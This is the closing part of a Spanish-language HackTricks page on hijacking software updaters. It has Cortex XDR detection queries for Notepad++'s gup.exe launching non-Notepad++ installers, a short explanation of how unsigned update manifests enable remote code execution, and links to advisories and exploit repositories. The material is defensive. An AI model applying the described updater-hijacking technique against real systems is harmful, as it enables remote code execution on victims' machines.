| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando un instalador que no es de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Estos patrones se aplican a cualquier updater que acepte manifests sin firmar o no verifique los signers de los instaladores: el secuestro de red + un instalador malicioso + sideloading firmado con una clave propia permiten la ejecución remota de código bajo la apariencia de actualizaciones «de confianza».

---
## References
- [1] [Aviso – Netskope Client for Windows – Escalada de privilegios local mediante un servidor fraudulento (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Aviso de seguridad de Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin de Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – cliente/exploit de IPC de Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre y Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalada de privilegios local mediante archivos con permisos de escritura en Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalada de privilegios en el agente de Windows](https://checkmk.com/werk/16361)
- [10] [PoC de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Actores estatales explotan la cadena de suministro de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – actualización sobre el incidente de infraestructura secuestrada](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Cómo eludir la corrección de CVE-2025-0309 en Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Detección de vulnerabilidades de escalada de privilegios en Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: de gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
